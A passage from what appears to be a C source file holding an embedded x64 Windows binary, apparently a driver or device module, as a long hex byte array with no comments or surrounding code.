		0x43, 0x56, 0x75, 0x18, 0x66, 0x83, 0x7C, 0x43, 0x02, 0x45, 0x75, 0x10, 0x66, 0x83, 0x7C, 0x43, 0x04, 0x4E, 0x75, 0x08, 0x66, 0x83, 0x7C, 0x43, 0x06, 0x5F, 0x74, 0x0F, 0x66, 0xFF, 0xC1, 0x0F, 0xB7, 0xC1, 0x3B, 0xC2, 0x7C, 0xCA, 0xE9, 0xE0,
		0x00, 0x00, 0x00, 0x4C, 0x8D, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0xBA, 0xFF, 0x01, 0x1F, 0x00, 0xFF, 0x15, 0x13, 0x2D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xB4, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x6C,
		0x24, 0x20, 0x49, 0x8B, 0x7D, 0x00, 0x48, 0x85, 0xFF, 0x4C, 0x8B, 0x65, 0x08, 0x75, 0x25, 0xBA, 0x50, 0x02, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0xFF, 0x15, 0x0E, 0x2C, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF0,
		0x0F, 0x84, 0x83, 0x00, 0x00, 0x00, 0x49, 0x89, 0x45, 0x00, 0xEB, 0x42, 0xBA, 0x50, 0x02, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0xFF, 0x15, 0xE9, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0xF0, 0x48, 0x8D, 0x87, 0x48, 0x02, 0x00,
		0x00, 0x4C, 0x39, 0x30, 0x74, 0x19, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x48, 0x8B, 0x38, 0x48, 0x8D, 0x87, 0x48, 0x02, 0x00, 0x00, 0x4C, 0x39, 0x30, 0x75, 0xF1, 0x48, 0x89, 0xB7, 0x48, 0x02, 0x00, 0x00, 0x48, 0x85,
		0xF6, 0x74, 0x36, 0x48, 0x8B, 0xCE, 0x4C, 0x89, 0x66, 0x38, 0x48, 0x89, 0x6E, 0x30, 0x4C, 0x89, 0xB6, 0x48, 0x02, 0x00, 0x00, 0xE8, 0x7E, 0xFC, 0xFF, 0xFF, 0x41, 0xFF, 0x45, 0x08, 0x48, 0x8B, 0xCE, 0xE8, 0xD2, 0xF8, 0xFF, 0xFF, 0x48, 0x8D,
		0x4E, 0x40, 0x41, 0xB8, 0x03, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xD3, 0xFF, 0x15, 0x4F, 0x2C, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x4C, 0x89, 0x74, 0x24, 0x30, 0x0F, 0xB7, 0x44, 0x24, 0x3A, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x48, 0xD1, 0xE8,
		0x48, 0x8D, 0x1C, 0x43, 0x48, 0x8B, 0xD3, 0xFF, 0x15, 0xCB, 0x2B, 0x00, 0x00, 0x66, 0x44, 0x8B, 0x5C, 0x24, 0x38, 0x66, 0x45, 0x85, 0xDB, 0x0F, 0x85, 0x9D, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0x64, 0x24, 0x78, 0x48, 0x8B, 0xBC, 0x24, 0x80, 0x00,
		0x00, 0x00, 0x48, 0x8B, 0xB4, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x33, 0xD2, 0xFF, 0x15, 0x29, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x4C,
		0x8B, 0x74, 0x24, 0x68, 0x4C, 0x8B, 0x6C, 0x24, 0x70, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xE8, 0xE5, 0x11, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x8B, 0xE9, 0x33, 0xF6, 0x48, 0x8D, 0x48, 0xE8, 0x48, 0x89, 0x78, 0x20, 0x48, 0x89, 0x70, 0xE8, 0x89, 0x70, 0xF0, 0xE8,
		0x44, 0xFD, 0xFF, 0xFF, 0x48, 0x85, 0xED, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x8B, 0xDF, 0x74, 0x71, 0x8B, 0x45, 0x00, 0x48, 0x8D, 0x0D, 0x4D, 0x1C, 0x00, 0x00, 0x44, 0x8B, 0xC8, 0x44, 0x8B, 0xC0, 0x0F, 0xB6, 0xD0, 0x41, 0xC1, 0xE9, 0x0D,
		0x41, 0xC1, 0xE8, 0x08, 0x41, 0x83, 0xE1, 0x07, 0x41, 0x83, 0xE0, 0x1F, 0xE8, 0x8F, 0xE9, 0xFF, 0xFF, 0x44, 0x8B, 0x44, 0x24, 0x28, 0x44, 0x8B, 0xDE, 0x45, 0x85, 0xC0, 0x74, 0x3C, 0x66, 0x90, 0x48, 0x85, 0xDB, 0x74, 0x35, 0x8B, 0x0B, 0x8B,
		0x55, 0x00, 0x8B, 0xC1, 0x33, 0xC2, 0x84, 0xC0, 0x75, 0x19, 0x8B, 0xC1, 0x33, 0xC2, 0xA9, 0x00, 0x1F, 0x00, 0x00, 0x75, 0x0E, 0x33, 0xCA, 0xF7, 0xC1, 0x00, 0xE0, 0x00, 0x00, 0x75, 0x04, 0x48, 0x8B, 0x73, 0x38, 0x48, 0x8B, 0x9B, 0x48, 0x02,
		0x00, 0x00, 0x41, 0xFF, 0xC3, 0x45, 0x3B, 0xD8, 0x72, 0xC6, 0x48, 0x85, 0xFF, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x74, 0x24, 0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0xAA, 0x2A, 0x00, 0x00, 0x48, 0x8B, 0x9F, 0x48, 0x02, 0x00, 0x00, 0x33, 0xD2, 0x48,
		0x8B, 0xCF, 0xFF, 0x15, 0x28, 0x2A, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x48, 0x8B, 0xFB, 0x75, 0xDC, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0xC6, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x8B, 0xD9, 0x48, 0x8D,
		0x48, 0xE8, 0x48, 0x89, 0x78, 0x20, 0x48, 0x8B, 0xEA, 0x48, 0xC7, 0x40, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x40, 0xF0, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x02, 0x40, 0x6A, 0xC8, 0xE8, 0x36, 0xFC, 0xFF, 0xFF, 0x48, 0x85, 0xDB, 0x48, 0x8B, 0x7C,
		0x24, 0x20, 0x48, 0x8B, 0xD7, 0x74, 0x6D, 0x44, 0x8B, 0x54, 0x24, 0x28, 0x45, 0x33, 0xC0, 0x45, 0x85, 0xD2, 0x74, 0x60, 0x48, 0x85, 0xD2, 0x74, 0x5B, 0x8B, 0x0A, 0x44, 0x8B, 0x0B, 0x8B, 0xC1, 0x41, 0x33, 0xC1, 0x84, 0xC0, 0x75, 0x17, 0x8B,
		0xC1, 0x41, 0x33, 0xC1, 0xA9, 0x00, 0x1F, 0x00, 0x00, 0x75, 0x0B, 0x41, 0x33, 0xC9, 0xF7, 0xC1, 0x00, 0xE0, 0x00, 0x00, 0x74, 0x11, 0x48, 0x8B, 0x92, 0x48, 0x02, 0x00, 0x00, 0x41, 0xFF, 0xC0, 0x45, 0x3B, 0xC2, 0x72, 0xC7, 0xEB, 0x25, 0x48,
		0x8B, 0xCD, 0x41, 0xB8, 0x50, 0x02, 0x00, 0x00, 0xE8, 0xD3, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x30, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xBA, 0xFF, 0x01, 0x1F, 0x00, 0xFF, 0x15, 0x26, 0x2A, 0x00, 0x00, 0x33, 0xF6, 0x48, 0x85, 0xFF, 0x48,
		0x8B, 0x6C, 0x24, 0x48, 0x74, 0x26, 0x66, 0x90, 0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0x9E, 0x29, 0x00, 0x00, 0x48, 0x8B, 0x9F, 0x48, 0x02, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x1C, 0x29, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x48,
		0x8B, 0xFB, 0x75, 0xDC, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x8B, 0xC6, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x33, 0xC0, 0x48, 0x8D,
		0x4C, 0x24, 0x20, 0x48, 0x89, 0x7C, 0x24, 0x58, 0x48, 0x89, 0x44, 0x24, 0x20, 0x89, 0x44, 0x24, 0x28, 0xE8, 0x52, 0xFB, 0xFF, 0xFF, 0x0F, 0xB7, 0x54, 0x24, 0x28, 0x44, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8D, 0x0D, 0x81, 0x1A, 0x00, 0x00, 0xE8,
		0xBC, 0xE7, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x85, 0xFF, 0x74, 0x2E, 0x48, 0x89, 0x5C, 0x24, 0x50, 0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0x1B, 0x29, 0x00, 0x00, 0x48, 0x8B, 0x9F, 0x48, 0x02, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B,
		0xCF, 0xFF, 0x15, 0x99, 0x28, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x48, 0x8B, 0xFB, 0x75, 0xDC, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x66, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x33, 0xC0, 0x48, 0x89, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0xD9, 0x48, 0x8D, 0x4C, 0x24, 0x20,
		0x48, 0x89, 0x74, 0x24, 0x50, 0x48, 0x89, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0xEA, 0x48, 0x89, 0x44, 0x24, 0x20, 0x89, 0x44, 0x24, 0x28, 0xE8, 0xAD, 0xFA, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x66, 0x33, 0xF6, 0x4C, 0x8B, 0xC7, 0x66, 0x39,
		0x75, 0x00, 0x76, 0x47, 0x4D, 0x85, 0xC0, 0x74, 0x42, 0x41, 0x0F, 0xB6, 0x00, 0x0F, 0xB7, 0xD6, 0x66, 0xFF, 0xC6, 0x48, 0x69, 0xD2, 0x08, 0x01, 0x00, 0x00, 0x88, 0x04, 0x1A, 0x8B, 0x04, 0x1A, 0x41, 0x33, 0x00, 0x25, 0x00, 0x1F, 0x00, 0x00,
		0x31, 0x04, 0x1A, 0x8B, 0x04, 0x1A, 0x8B, 0xC8, 0x41, 0x33, 0x08, 0x81, 0xE1, 0x00, 0xE0, 0x00, 0x00, 0x33, 0xC8, 0x89, 0x0C, 0x1A, 0x66, 0x3B, 0x75, 0x00, 0x4D, 0x8B, 0x80, 0x48, 0x02, 0x00, 0x00, 0x72, 0xB9, 0x48, 0x85, 0xFF, 0x74, 0x24,
		0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0x3E, 0x28, 0x00, 0x00, 0x48, 0x8B, 0x9F, 0x48, 0x02, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xBC, 0x27, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x48, 0x8B, 0xFB, 0x75, 0xDC, 0x48, 0x8B, 0x7C, 0x24,
		0x58, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x66, 0x89, 0x75, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x83, 0xEC, 0x58, 0x48, 0x89, 0x5C, 0x24, 0x78, 0x48, 0x89, 0x6C, 0x24, 0x50, 0x48, 0x89, 0x74, 0x24, 0x48, 0x48, 0x8B, 0xEA, 0x48, 0x8B, 0xF1, 0x48, 0x89, 0x7C, 0x24, 0x40, 0x4C, 0x89, 0x64, 0x24, 0x38, 0x45, 0x8B, 0xE0, 0x41, 0xB8,
		0x44, 0x64, 0x6B, 0x20, 0xBA, 0x00, 0x01, 0x00, 0x00, 0x33, 0xC9, 0xBB, 0x02, 0x80, 0x6A, 0xC8, 0xFF, 0x15, 0x42, 0x27, 0x00, 0x00, 0x48, 0x85, 0xED, 0x48, 0x8B, 0xF8, 0x74, 0x3F, 0x48, 0x85, 0xC0, 0x74, 0x54, 0x48, 0x8B, 0xCE, 0xE8, 0x3D,
		0xFC, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x2D, 0x45, 0x33, 0xC9, 0x41, 0xB0, 0x0F, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0xC7, 0x44, 0x24, 0x20, 0x40, 0x00, 0x00, 0x00, 0xE8, 0x3F, 0xF3, 0xFF, 0xFF, 0x4D, 0x8B, 0xC4, 0x48, 0x8B, 0xD7, 0x49,
		0xC1, 0xE0, 0x02, 0x48, 0x8B, 0xCD, 0xE8, 0x7D, 0x09, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x85, 0xFF, 0x74, 0x15, 0x48, 0x8D, 0x15, 0xDF, 0x18, 0x00, 0x00, 0x41, 0xB8, 0xF3, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0x71, 0xE4, 0xFF, 0xFF, 0x4C,
		0x8B, 0x64, 0x24, 0x38, 0x48, 0x8B, 0x7C, 0x24, 0x40, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24, 0x50, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x78, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x4D, 0x85, 0xC0, 0x48, 0x89, 0x5C, 0x24, 0x58, 0x48, 0x89, 0x7C, 0x24, 0x30, 0x8B, 0xFA, 0x49, 0x8B, 0xD8, 0x74, 0x45, 0xE8, 0xA3, 0xFB, 0xFF, 0xFF, 0x48, 0x85, 0xC0,
		0x74, 0x3B, 0x44, 0x8D, 0x0C, 0xBD, 0x00, 0x00, 0x00, 0x00, 0x41, 0xB0, 0x0F, 0x48, 0x8B, 0xD3, 0x48, 0x8B, 0xC8, 0xC7, 0x44, 0x24, 0x20, 0x04, 0x00, 0x00, 0x00, 0xE8, 0xA0, 0xF2, 0xFF, 0xFF, 0x33, 0xD2, 0xB9, 0x09, 0x40, 0x6A, 0xC8, 0x85,
		0xC0, 0x0F, 0x49, 0xCA, 0x8B, 0xC1, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x48, 0x8B, 0x5C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x48, 0x8B, 0x5C, 0x24, 0x58, 0xB8, 0x02, 0x40, 0x6A, 0xC8, 0x48, 0x83, 0xC4, 0x38,
		0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x44, 0x89, 0x44, 0x24, 0x18, 0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x9C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x7C, 0x24,
		0x78, 0x8B, 0xFA, 0xE8, 0x20, 0xFB, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x0F, 0x84, 0xD4, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x58, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x89, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15,
		0x84, 0x26, 0x00, 0x00, 0x33, 0xF6, 0x4C, 0x8D, 0x5C, 0x24, 0x48, 0x48, 0x8D, 0x44, 0x24, 0x58, 0x8D, 0x4E, 0x1B, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0xD3, 0x48, 0x89,
		0x74, 0x24, 0x20, 0xFF, 0x15, 0x4F, 0x26, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD0, 0x74, 0x6D, 0x48, 0x8B, 0x88, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x83, 0xE9, 0x48, 0x74, 0x60, 0xC7, 0x40, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0x48, 0x8D, 0x84,
		0x24, 0xA0, 0x00, 0x00, 0x00, 0xC6, 0x01, 0x1B, 0x48, 0x89, 0x41, 0x10, 0x8D, 0x04, 0xBD, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x41, 0x01, 0x10, 0xC7, 0x41, 0x20, 0x04, 0x00, 0x00, 0x00, 0x89, 0x71, 0x08, 0x89, 0x41, 0x18, 0x48, 0x8B, 0xCB, 0xFF,
		0x15, 0xFB, 0x25, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x44, 0x8B, 0xD8, 0x75, 0x24, 0x48, 0x8D, 0x4C, 0x24, 0x58, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0xD1, 0x25, 0x00, 0x00, 0x44,
		0x8B, 0x5C, 0x24, 0x48, 0xEB, 0x05, 0x44, 0x8B, 0x5C, 0x24, 0x40, 0xB8, 0x09, 0x40, 0x6A, 0xC8, 0x45, 0x85, 0xDB, 0x0F, 0x49, 0xC6, 0x48, 0x8B, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0xEB, 0x05, 0xB8, 0x02, 0x40, 0x6A, 0xC8, 0x48, 0x8B, 0x7C,
		0x24, 0x78, 0x48, 0x8B, 0x9C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x81, 0xEC, 0x88, 0x01, 0x00, 0x00, 0x48, 0x89, 0x58, 0xF8, 0x48, 0x89,
		0x68, 0xF0, 0x48, 0x89, 0x70, 0xE8, 0x48, 0x89, 0x78, 0xE0, 0x4C, 0x89, 0x60, 0xD8, 0x4C, 0x89, 0x68, 0xD0, 0x4C, 0x8B, 0xE9, 0x41, 0x8B, 0xF9, 0x41, 0x0F, 0xB6, 0xD8, 0x8B, 0xF2, 0x41, 0xBC, 0x02, 0x40, 0x6A, 0xC8, 0xC7, 0x44, 0x24, 0x30,
		0x00, 0x00, 0x00, 0x00, 0xE8, 0xDF, 0xF9, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xE8, 0x0F, 0x84, 0x50, 0x01, 0x00, 0x00, 0x45, 0x33, 0xE4, 0x80, 0xFB, 0x0F, 0x75, 0x27, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0x49, 0x8B, 0xD5, 0x41, 0xB8, 0x08,
		0x01, 0x00, 0x00, 0xE8, 0x28, 0x07, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0x44, 0x8B, 0xC7, 0x8B, 0xD6, 0xE8, 0x69, 0xFE, 0xFF, 0xFF, 0xE9, 0x24, 0x01, 0x00, 0x00, 0x80, 0xFB, 0x03, 0x75, 0x2E, 0x0F, 0xB7, 0xC7, 0x44, 0x8D, 0x0C, 0xB5,
		0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0xE8, 0x98, 0xF0, 0xFF, 0xFF, 0x33, 0xC0, 0xE9, 0xF1, 0x00, 0x00, 0x00, 0x80,
		0xFB, 0x0C, 0x75, 0x2E, 0x44, 0x8D, 0x0C, 0xB5, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0xC1, 0xEF, 0x10, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xC8, 0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00, 0x89, 0x7C, 0x24, 0x30, 0xE8, 0x65,
		0xF0, 0xFF, 0xFF, 0x33, 0xC0, 0xE9, 0xBE, 0x00, 0x00, 0x00, 0xF6, 0xC3, 0x01, 0x74, 0x28, 0x40, 0x0F, 0xB6, 0xC7, 0x44, 0x8D, 0x0C, 0xB5, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0xC7, 0x44,
		0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0xE8, 0x31, 0xF0, 0xFF, 0xFF, 0xF6, 0xC3, 0x02, 0x74, 0x2C, 0x8B, 0xC7, 0x44, 0x8D, 0x0C, 0xB5, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0xC1, 0xE8, 0x08, 0x41, 0xB0,
		0x10, 0x48, 0x8B, 0xCD, 0x0F, 0xB6, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0xE8, 0x00, 0xF0, 0xFF, 0xFF, 0xF6, 0xC3, 0x04, 0x74, 0x2C, 0x8B, 0xC7, 0x44, 0x8D, 0x0C, 0xB5, 0x02, 0x00, 0x00, 0x00, 0x48,
		0x8D, 0x54, 0x24, 0x30, 0xC1, 0xE8, 0x10, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0x0F, 0xB6, 0xC0, 0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0xE8, 0xCF, 0xEF, 0xFF, 0xFF, 0xF6, 0xC3, 0x08, 0x74, 0x27, 0xC1, 0xEF,
		0x18, 0x44, 0x8D, 0x0C, 0xB5, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x41, 0xB0, 0x10, 0x48, 0x8B, 0xCD, 0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0x89, 0x7C, 0x24, 0x30, 0xE8, 0xA3, 0xEF, 0xFF, 0xFF, 0x41, 0x8B, 0xC4,
		0x4C, 0x8B, 0xAC, 0x24, 0x58, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xA4, 0x24, 0x60, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xBC, 0x24, 0x68, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xB4, 0x24, 0x70, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0x78, 0x01, 0x00, 0x00,
		0x48, 0x8B, 0x9C, 0x24, 0x80, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x88, 0x01, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x48, 0x89, 0x7C, 0x24,
		0x48, 0x48, 0x8B, 0xF9, 0x48, 0x8B, 0xDA, 0x0F, 0x84, 0xB9, 0x00, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4A, 0x08, 0x48, 0x8D, 0x57, 0x08, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x77, 0x05, 0x00,
		0x00, 0x44, 0x0F, 0xB6, 0x9F, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x28, 0x15, 0x00, 0x00, 0x44, 0x88, 0x9B, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x07, 0x48, 0x89, 0x03, 0x48, 0x8B, 0x87, 0x10, 0x01, 0x00, 0x00, 0x48, 0x89, 0x83, 0x10,
		0x01, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x20, 0x01, 0x00, 0x00, 0x48, 0x89, 0x83, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x18, 0x01, 0x00, 0x00, 0xC6, 0x83, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x83, 0x18, 0x01, 0x00, 0x00, 0x8B, 0x83,
		0x70, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x93, 0x18, 0x01, 0x00, 0x00, 0x89, 0x83, 0x40, 0x01, 0x00, 0x00, 0x8B, 0x83, 0x64, 0x01, 0x00, 0x00, 0x89, 0x83, 0x34, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x83, 0x60, 0x01, 0x00, 0x00, 0x88, 0x83, 0x30, 0x01,
		0x00, 0x00, 0x48, 0x8B, 0x83, 0x68, 0x01, 0x00, 0x00, 0x48, 0x89, 0x83, 0x38, 0x01, 0x00, 0x00, 0xE8, 0x6B, 0xE1, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x8B,
		0x7C, 0x24, 0x48, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xB8, 0x03, 0x00, 0x6A, 0xC8, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x74, 0x39, 0x80, 0xB9, 0x29, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xC4, 0x14, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xAD, 0x14, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x76, 0x14,
		0x00, 0x00, 0x48, 0x0F, 0x45, 0xD0, 0xE8, 0xFD, 0xE0, 0xFF, 0xFF, 0x0F, 0xB6, 0x83, 0x29, 0x01, 0x00, 0x00, 0xC6, 0x83, 0x29, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC,
